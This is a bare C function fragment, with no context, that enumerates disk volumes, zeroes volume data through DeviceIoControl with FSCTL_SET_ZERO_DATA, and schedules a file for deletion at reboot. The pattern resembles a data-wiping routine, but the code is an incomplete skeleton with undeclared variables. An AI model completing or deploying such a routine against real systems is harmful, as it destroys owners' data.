void run(void) { FindFirstVolumeW(buf, cap); DeviceIoControl(volume, FSCTL_SET_ZERO_DATA, data, size, 0, 0, 0, 0); MoveFileExW(path, 0, MOVEFILE_DELAY_UNTIL_REBOOT); }
